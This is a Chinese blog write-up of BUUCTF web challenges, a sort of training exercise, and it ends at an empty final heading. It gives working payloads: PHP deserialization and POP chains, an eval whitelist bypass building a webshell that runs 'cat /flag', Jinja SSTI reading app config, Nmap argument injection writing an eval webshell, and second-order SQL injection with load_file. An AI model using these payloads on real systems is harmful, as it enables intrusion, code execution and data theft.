---
title: "BUUCTF Web Writeup 4"
date: 2022-08-28T15:47:40+08:00
lastmod: 2022-08-28T15:47:40+08:00
draft: true
author: "X1r0z"

tags: ['ctf','php']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [安洵杯 2019]easy_serialize_php

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

一开始看 phpinfo 以为是 session_upload_progress, 然后一直想不通怎么利用

后来再看一遍的时候看到了这个

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281614734.png)

想了想应该是通过最后一句的 file_get_contents 读取 d0g3_f1ag.php

读取的关键点是 `$_SESSION['img']`, 但是用户自定义的 img 路径最后会被 sha1 加密, 无法 base64 decode

但是 session 中 function 可控, 而且可以通过 `$_POST` 变量覆盖

看到 filter 函数会对 serialize 之后的内容进行过滤, 想到了字符串逃逸

参考文章 [https://xz.aliyun.com/t/9213](https://xz.aliyun.com/t/9213)

先在本地调试一下

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

$_SESSION['img'] = base64_encode('guest_img.png');

echo serialize($_SESSION);
echo "\n";
echo filter(serialize($_SESSION));
echo "\n";
var_dump(unserialize(filter(serialize($_SESSION))));

?>
```

这一题是缩短逃逸, 我们必须在原来序列化后的 img 前插入逃逸代码, 而且不能在 user 处直接插入, 否则的话逃逸代码会被吞掉变成字符串

因为有了 extract 变量覆盖, 我们可以在 user 后面构造一个 session 值 aa

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281621704.png)

先随便输入一些被替换的字符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281623118.png)

然后计算高亮字符串的长度, `";s:2:"aa";s:25:"A` 长度 18

在 user 处输入总长度为 18 的可被替换的字符串, 例如 `flagflagflagphpphp`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281626951.png)

这里并没有成功

想了一下发现前面的属性数量为 3, 而逃逸后的属性数量为 2, 需要再随便构造一个属性凑到 3 才行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281628367.png)

逃逸成功, 之后再放到题目网站上, 替换一下 img 路径

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281630523.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281630741.png)

## [ASIS 2019]Unicorn shop

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281747626.png)

右键注释

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281747098.png)

以及根据题目标签里的 unicode, 感觉可能是 unicode 欺骗之类的

什么都不填, 直接提交会报错

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281748787.png)

前三件商品 purchase 一直显示错误

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281749223.png)

把 2 改成 2.0

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281749681.png)

提示只能用一个字符

当 id=4 时

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281749600.png)

按着报错信息来的话, 我们应该是要买第四件商品才能得到 flag

关于 unicode 安全性的参考文章

[https://xz.aliyun.com/t/5402](https://xz.aliyun.com/t/5402)

[https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/](https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/)

我的思路是从 unicode-table 上找到一些比 1337 还要大的单个字符

一开始搜 numbers 一直没找到... 换成 thousand 才出来一大堆

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281752869.png)

用第一个字符 ten thousand, 直接复制到 burp 里面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208281753919.png)

## [MRCTF2020]Ezpop

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

简单反序列化 pop 链构造, learn from 那里是介绍魔术方法的文章, 已经无法访问了, 但是不影响做题

这题的利用点是 Modifier 类的 append 方法, 通过文件包含配合伪协议读取 flag.php 的内容

触发的前提是 \_\_invoke, 即以函数形式调用, 然后我们可以发现这个调用存在于 Test 类的 \_\_get 方法中

\_\_get 的前提是访问一个不存在的属性, 而在 Show 类的 \_\_toString 方法里面存在着可以利用的语句 `$this->str->source`

然后 \_\_wakeup 的 preg\_match 函数可以触发 \_\_toString

写的时候把利用链倒过来写就行了

payload

```php
<?php

class Modifier{
    protected $var = 'php://filter/convert.base64-encode/resource=flag.php';
}

class Test{
    public $p;
}

class Show{
    public $source;
    public $str;
}


$d = new Modifier();

$c = new Test();
$c->p = $d;

$b = new Show();
$b->str = $c;

$a = new Show();
$a->source = $b;

echo urlencode(serialize($a));

?>
```

base64 解码后得到 flag

```php
<?php
class Flag{
    private $flag= "flag{6e942f00-89fe-4787-b8b2-a01b80930d5e}";
}
echo "Help Me Find FLAG!";
?>
```

## [CISCN 2019 初赛]Love Math

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

这题做了挺长时间的, 主要是有 80 字符的长度限制, 比较恶心

关键函数是 base_convert, 可以任意进制互转 (2~36)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282043365.png)

我们选用十进制和三十六进制互转

因为高于十进制的话含有字母, 就需要加引号了, 而引号会被过滤, 三十六进制是方便字母的转换 (0-9 a-z 数量加起来是 36)

另外还需要注意的是 dechex 和 hex2bin 这个函数, 因为 base_convert 只能转换 0-9 a-z, 特殊字符例如空格和 `$` 之类的符号转换的时候会丢失, 而利用两个函数可以把任意字符串转换成十六进制, 然后再转换成纯数字的十进制

自己一开始的思路是构造 system 执行命令, 不过执行 `/cat /flag` 就超出长度限制了...

后来想了想必须要尽可能的缩减 payload, 一个很好的例子就是形如 `$_GET[0]($_GET[1])` 这种 webshell

两个 `$_GET` 可以用同一个变量表示, `[]` 可以用 `{}` 绕过

下面就是如何构造 `_GET` 了, 思路把原始字符串先 bin2hex 然后 hexdec

```php
echo hex2bin(dechex(1598506324)); // _GET
```

dechex 在白名单里面, 而 hex2bin 需要我们手动构造 (利用 base_convert)

```php
echo base_convert(37907361743,10,36); // hex2bin
```

之后需要引入一个变量来作为函数执行, 例如 `$a()`, 我们用 `$pi` 以绕过白名单的检测

payload 如下

```php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{0})($$pi{1});
```

然后传参 0 1 获取 flag

```
http://f91dae26-bec7-4887-8f52-d087acfcec50.node4.buuoj.cn:81/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{0})($$pi{1});&0=system&1=cat /flag
```

wp 看到的其它思路

```php
$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) // exec(getallheaders(){1})
```

还有通过三角函数进行位运算得到 `*` 然后直接 `cat /f*`, 这里就不写了...

## [WesternCTF2018]shrine

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

括号替换这个无解, 单字符替换绕不过去...

config 虽然是在 blacklist 里的但是没有直接替换成空, 而是把这个对象设置为 None, 这样直接注入 `{{config}}` 就显示不出信息了

但是在 flask 中可以通过其它函数访问到 config

利用 `__globals__` 访问 current_app, 后者就是当前的 app 的映射, 自然就能访问到 app.config

然后是只有函数才有 `__globals__`

```python
url_for.__globals__['current_app'].config
get_flashed_messages.__globals__['current_app'].config
```

又找了其它函数试了一下, 好像只有这两个能用

```
http://1ed4a4d2-bd0d-45c2-9554-2e20a6892221.node4.buuoj.cn:81/shrine/{{url_for.__globals__['current_app'].config}}
```

## [网鼎杯 2020 朱雀组]Nmap

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282135735.png)

随便输了个 127.0.0.1

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282135617.png)

url 如下

```
http://b4483574-049a-465c-af1b-ef87424d03fd.node4.buuoj.cn:81/result.php?f=9228e
```

一开始以为是文件包含, 然后发现报错的信息是 xml

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282136478.png)

提示 xml 保存在 /xml/ 目录, 访问之前的扫描结果

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282136536.png)

感觉不太像 xxe, 于是又回到最开始的界面, 可能是命令注入?

试了一下发现注入的命令 `127.0.0.1;ls` 还是包裹在引号里面的

再输入单引号试试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282137383.png)

有转义, 有一点熟悉, 应该是 escapeshellarg + escapeshellcmd 的组合

直接拿之前推出来的 payload

过滤了 php 字符, 稍微改一改

```
'<?=eval($_REQUEST[1])?> -oG a.phtml '
```

蚁剑查看 /flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282140418.png)

wp 里的其它思路

利用的是 nmap 的 `-iL` 参数, 加载待扫描的主机列表

```
127.0.0.1' -iL /flag -o haha
```

escapeshellarg 和 escapeshellcmd 两个组合使用还是不能一眼看出来... 只能一遍一遍慢慢推

```
127.0.0.1' -iL /flag -o haha

'127.0.0.1'\'' -iL /flag -o haha '

'127.0.0.1'\\'' -iL /flag -o haha \'

```

总之就是在 127.0.0.1 后面加了个单引号, 然后因为各种奇葩操作使前面的内容自己闭合, 后面的命令就逃逸出来了

注意最后面要加个空格才能写进 `haha` 里面, 不然的话写进的就是 `haha'` 文件 (但也能正常访问)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282152124.png)

## [MRCTF2020]PYWebsite

构造 xff 头

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282203505.png)

## [SWPU2019]Web1

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282313678.png)

登录和注册有页面没有注入

注册一个 test test 登录看一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282313403.png)

发布广告, 随便写一点内容

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282314581.png)

有一个 "待管理确认", 以为是 xss, 结果 payload 弄进去半天了还是这个状态...

只能换个思路

在发布广告的页面输入单引号提交, 然后查看广告详情

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282315086.png)

有报错, 说明是二次注入

试了下 and order by updatexml extractvalue floor rand 这些都被过滤了, 不能报错注入

union select 没被过滤, 可以手工猜列数

空格会被删掉, 用 `/**/` 绕过

```sql
'/**/union/**/select/**/1,user(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

一直试到 22 列...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282318322.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282318276.png)

root 账号, 可以 load_file, 不过 flag.php /flag 都不存在, 应该是在数据库里

于是先读了一下 addads.php 看看过滤了什么

```php
if(preg_match("/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i", $title))
```

问题不大

然后读 register.php 查看表的结构

```sql
'/**/union/**/select/**/1,load_file('/var/www/html/register.php'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

```php
<?php
include_once("./config.php");
error_reporting(0);

if(isset($_POST['ac'])){
    if($_POST['ac'] === 'register'){
        $username = htmlspecialchars(addslashes($_POST['username']));
        $password = md5($_POST['password']);
        // echo $username;
        // if(check($username)){
        //  die("Oh No! You are a hacker!! Not here!!!<br>");
        // }
        // echo $username;
        $sql_query = "select * from users where name = '$username' limit 0,1";
        $sql_insert = "insert into users (name, pass) values ('$username','$password')";

        $result_query = $conn->query($sql_query);
        if($result_query->num_rows){
            die("<font color='red' size='4'>该用户已被注册</font>");
        }else{
            $result_insert = $conn->query($sql_insert);
            if($result_insert){
                header("Location: login.php");
                exit();
            }else{
                die("<font color='red' size='4'>注册失败</font>");
            }
        }
    }
}

$conn->close();
?>
......
```

列数据

```sql
'/**/union/**/select/**/1,(select/**/group_concat(name,0x7e,pass)/**/from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208282322917.png)

看 wp 的时候发现自己又非预期了... 题目考察的是无列名注入

information_schema 被过滤了, 因为含有 or

参考文章

[https://blog.csdn.net/m0_49835838/article/details/109159839](https://blog.csdn.net/m0_49835838/article/details/109159839)

[https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/](https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/)

**information_schema 的绕过**

> InnoDB 数据表 (mysql > 5.6)
> 
> mysql.innodb_table_stats
> 
> mysql.innodb_index_stats

这个需要配置 `default-storage-engine=InnoDB`, 默认条件下的存储引擎是 MyISAM

```sql
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();

select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();
```

> sys 库 (mysql > 5.7)
> 
> sys.schema_auto_increment_columns
> 
> sys.schema_table_statistics_with_buffer
> 
> sys.x$schema_table_statistics
> 
> sys.x$ps_schema_table_statistics_io
> ......

```sql
select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database();

select group_concat(table_name) from  sys.schema_table_statistics_with_buffer where table_schema=database();

select group_concat(table_name) from sys.x$schema_table_statistics where table_schema=database();

select group_concat(table_name) from sys.x$ps_schema_table_statistics_io where table_schema=database();
```

题目数据库版本是 `10.2.26-MariaDB-log`, mariadb 和 mysql 的版本对照有点奇妙...

能通过 InnoDB 表读取表名, 但是用不了 sys 库

```sql
'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208291220400.png)

**无列名注入**

方法很多, 例如 join...using, order by 盲注, 子查询, 有时间详细写一下

## [NPUCTF2020]ReadlezPHP

